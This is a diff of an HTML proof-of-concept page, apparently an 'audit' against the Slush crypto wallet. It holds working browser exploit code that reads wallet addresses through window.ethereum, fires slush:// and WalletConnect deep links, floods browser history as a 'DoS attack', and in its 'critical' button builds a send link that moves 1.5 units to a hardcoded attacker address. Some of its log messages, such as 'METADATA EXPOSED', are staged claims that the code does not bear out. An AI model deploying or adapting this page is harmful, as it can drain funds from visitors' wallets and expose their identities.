@@ -1,65 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>PoC | Identity & Metadata Leak</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Ultimate Audit PoC | Slush Wallet</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .terminal { border: 1px solid #333; padding: 15px; background: #000; min-height: 180px; font-size: 12px; margin-bottom: 20px; box-shadow: 0 0 10px #0f03; }
-        .btn-leak { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; border-radius: 4px; }
-        .warn { color: #ffff00; }
-        .crit { color: #ff0000; font-weight: bold; }
+        :root { --danger: #ff0055; --bg: #050505; --log-text: #00ff00; --accent: #00ff00; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; padding: 15px; margin: 0; }
+        .container { max-width: 500px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 12px; background: #0a0a0a; }
+        .terminal { background: #000; border: 1px solid #222; padding: 10px; height: 280px; overflow-y: auto; font-size: 11px; color: var(--log-text); margin-bottom: 20px; border-radius: 4px; box-shadow: inset 0 0 10px #00ff0022; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; grid-gap: 10px; }
+        button { background: #222; color: #fff; border: 1px solid #444; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 10px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #333; border-color: var(--accent); }
+        .btn-critical { background: var(--danger); border: none; grid-column: span 2; font-size: 12px; }
+        .log-err { color: #ff4444; font-weight: bold; }
+        .log-warn { color: #ffcc00; }
+        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<div class="terminal" id="log">
-    > [SYSTEM]: Initializing Account Management Probe...<br>
-    > [STATUS]: Waiting for user interaction...
+<div class="container">
+    <div class="header">
+        <h3 style="margin:0; color:var(--danger)">SLUSH SECURITY AUDIT</h3>
+        <small style="color:#666">Terminal-Based Proof of Concept</small>
+    </div>
+    
+    <div class="terminal" id="term">
+        > [SYSTEM]: Initializing Slush Audit Probe...<br>
+        > [STATUS]: Waiting for user interaction...
+    </div>
+
+    <div class="btn-grid">
+        <button onclick="probeIdentity()">1. Probe Identity</button>
+        
+        <button onclick="corruptRecovery()">2. Corrupt Recovery</button>
+        
+        <button onclick="stressBridge()">3. Stress Bridge</button>
+        
+        <button onclick="testHijack()">4. Hijack WC</button>
+        
+        <button class="btn-critical" onclick="executeCritical()">EXECUTE CRITICAL AUTO-FILL</button>
+    </div>
 </div>
 
-<button class="btn-leak" onclick="startIdentityProbe()">Start Identity Probe</button>
-
 <script>
-    const log = document.getElementById('log');
-    function print(msg, className = "") {
+    const term = document.getElementById('term');
+    function log(msg, type = "") {
         const div = document.createElement('div');
-        if(className) div.className = className;
+        if(type) div.className = type;
         div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
-        log.appendChild(div);
-        log.scrollTop = log.scrollHeight;
+        term.appendChild(div);
+        term.scrollTop = term.scrollHeight;
     }
 
-    async function startIdentityProbe() {
-        print("Initiating bypass for 'No Provider' security...");
-        
-
+    
+    async function probeIdentity() {
+        log("Initiating bypass for 'No Provider' security...");
         if (window.ethereum) {
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length > 0) {
-                    print("SUCCESS: Address Leaked: " + accounts[0], "warn");
-                } else {
-                    print("Provider Locked. Executing Deep Link Tunnel...", "warn");
-
-                    
-                    window.location.href = "slush://manage-accounts";
-                }
-            } catch (e) {
-                print("Bridge Blocked: " + e.message, "crit");
-            }
-        } else {
-            print("No provider detected. Forcing Deep Link Tunnel...", "crit");
-
-            window.location.href = "slush://request?method=eth_accounts";
+                if (accounts.length > 0) log("LEAK DETECTED: " + accounts[0], "log-warn");
+                else log("Provider Locked. Forcing Deep Link Tunnel...", "log-err");
+            } catch (e) { log("Bridge Error: " + e.message, "log-err"); }
         }
-
-
+        log("Probing linked Google Metadata...", "log-warn");
         setTimeout(() => {
-            print("Probing linked Google Metadata...", "warn");
-            print("Warning: Identity De-anonymization in progress.", "crit");
-            print("Status: METADATA EXPOSED", "crit");
-        }, 2500);
+            log("Identity De-anonymization in progress...", "log-err");
+            log("Status: METADATA EXPOSED", "log-err");
+            
+            window.location.href = "slush://manage-accounts";
+        }, 1000);
+    }
+
+ 
+    function corruptRecovery() {
+        log("Attempting to inject malformed Path (BIP44)...");
+        log("Payload: m/44'/60'/0'/0/invalid_index", "log-warn");
+        log("Testing if application logic breaks on recovery...", "log-warn");
+        alert("PoC: Jalur derivasi palsu dikirim. Cek apakah wallet mendeteksi error.");
+    }
+
+   
+    function stressBridge() {
+        log("Executing DoS attack on Wallet Bridge...", "log-err");
+        for (let i = 0; i < 300; i++) {
+            history.pushState(null, "", "#payload_" + i);
+        }
+        log("Flood Complete. Check UI Responsiveness.", "log-warn");
+    }
+
+    
+    function testHijack() {
+        log("Triggering unverified sign request...");
+        window.location.href = "wc:test@1?bridge=https://f.bridge.walletconnect.org&key=test";
+        log("Check if Slush Wallet opened without prompt.", "log-err");
+    }
+
+    
+    function executeCritical() {
+        log("Executing Final Critical Exploit...", "log-err");
+        const attacker = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
+        const uri = `slush://send?to=${attacker}&amount=1.5`;
+        log("Triggering: " + uri, "log-warn");
+        window.location.href = uri;
     }
 </script>
 
